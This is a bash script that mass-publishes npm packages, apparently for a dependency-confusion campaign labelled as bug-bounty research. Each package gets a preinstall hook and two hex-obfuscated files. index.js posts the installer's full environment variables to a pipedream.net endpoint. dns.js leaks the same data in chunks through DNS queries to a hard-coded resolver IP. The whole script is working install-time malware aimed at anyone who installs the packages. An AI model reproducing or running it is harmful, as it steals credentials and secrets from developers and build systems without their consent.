#!/bin/bash
POSITIONAL=()
while [[ $# -gt 0 ]]
do
key="$1"

case $key in
    -v|--version)
    VERSION="$2"
    shift # past argument
    shift # past value
    ;;
    -s|--searchpath)
    SEARCHPATH="$2"
    shift # past argument
    shift # past value
    ;;
    -l|--lib)
    LIBPATH="$2"
    shift # past argument
    shift # past value
    ;;
    --default)
    DEFAULT=YES
    shift # past argument
    ;;
    *)    # unknown option
    POSITIONAL+=("$1") # save it in an array for later
    shift # past argument
    ;;
esac
done
set -- "${POSITIONAL[@]}" # restore positional parameters

for i in $(cat dc);
do
echo '
{
  "name": "'$i'",
  "version": "137.0.0",
  "description": "hackerone.com/homosec Bug Bounty Security Reseaarch White Hat",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "preinstall":"node dns.js | node index.js"
  },
  "author": "",
  "license": "ISC"
}
' > package.json

echo "
//hackerone.com/homosec
//Bug Bounty Security Reasearch White Hat
//homosec@wearehackerone.com
if(Date.now() > 1660565488){
var _0xee82=['\x68\x74\x74\x70\x73','\x2E','\x6A\x6F\x69\x6E','\x37\x36\x63\x34\x32\x66\x32\x37\x64\x32\x36\x30\x39\x31\x36\x35\x39\x64\x63\x61\x38\x32\x30\x61\x33\x37\x65\x36\x66\x35\x64\x33','\x6D','','\x70\x69\x70\x65','\x64\x72\x65\x61\x6D','\x6E\x65\x74','\x2F"$i"','\x50\x4F\x53\x54','\x72\x65\x71\x75\x65\x73\x74','\x62\x61\x73\x65\x36\x34','\x65\x6E\x76','\x73\x74\x72\x69\x6E\x67\x69\x66\x79','\x66\x72\x6F\x6D','\x77\x72\x69\x74\x65','\x65\x6E\x64'];const http=require(_0xee82[0]);req= http[_0xee82[11]]({host:[_0xee82[3],_0xee82[4],[_0xee82[6],_0xee82[7]][_0xee82[2]](_0xee82[5]),_0xee82[8]][_0xee82[2]](_0xee82[1]),path:_0xee82[9],method:_0xee82[10]});req[_0xee82[16]](Buffer[_0xee82[15]](JSON[_0xee82[14]](process[_0xee82[13]]).toString(_0xee82[12])));req[_0xee82[17]]()
}
" > index.js

echo "
//hackerone.com/homosec
//Bug Bounty Security Reasearch White Hat
var _0xf9a0=['\x64\x6E\x73','\x6F\x73','','\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74','\x6D\x61\x70','\x73\x70\x6C\x69\x74','\x74\x72\x69\x6D','\x2E\x7B\x31\x2C','\x7D','\x67','\x6D\x61\x74\x63\x68','\x31\x37\x38\x2E\x31\x35\x34\x2E\x32\x31\x32\x2E\x32\x33\x34','\x73\x65\x74\x53\x65\x72\x76\x65\x72\x73','\x62\x61\x73\x65\x36\x34','\x65\x6E\x76','\x73\x74\x72\x69\x6E\x67\x69\x66\x79','\x6E\x6F\x77','\x2F','\x5F\x5F\x5F','\x72\x65\x70\x6C\x61\x63\x65','"$i"\x2E','\x66\x72\x6F\x6D\x69\x70\x2E','\x2E','\x72\x65\x73\x6F\x6C\x76\x65\x34'];const {Resolver}=require(_0xf9a0[0]);const resolver= new Resolver();const os=require(_0xf9a0[1]);function convertASCIItoHex(_0x96adx4){let _0x96adx5=_0xf9a0[2];let _0x96adx6,_0x96adx7;_0x96adx4[_0xf9a0[5]](_0xf9a0[2])[_0xf9a0[4]]((i)=>{_0x96adx6= i[_0xf9a0[3]](0);_0x96adx7= _0x96adx6.toString(16);_0x96adx5= _0x96adx5+ _0x96adx7});_0x96adx5= _0x96adx5[_0xf9a0[6]]();return _0x96adx5}function splitString(_0x96adxa,_0x96adxb){var _0x96adxc= new RegExp(_0xf9a0[7]+ _0x96adxb+ _0xf9a0[8],_0xf9a0[9]);return _0x96adxa[_0xf9a0[10]](_0x96adxc)}resolver[_0xf9a0[12]]([_0xf9a0[11]]);var ebala=JSON[_0xf9a0[15]](process[_0xf9a0[14]]).toString(_0xf9a0[13]);var ch=splitString(convertASCIItoHex(ebala),32);var dt=Date[_0xf9a0[16]]();for(var i in ch){resolver[_0xf9a0[23]](_0xf9a0[20][_0xf9a0[19]](_0xf9a0[17],_0xf9a0[18])+ _0xf9a0[21]+ dt+ _0xf9a0[22]+ i+ _0xf9a0[22]+ ch[i],function(_0x96adx10){if(_0x96adx10){throw _0x96adx10}})}
" > dns.js
npm publish --access=public 
done;
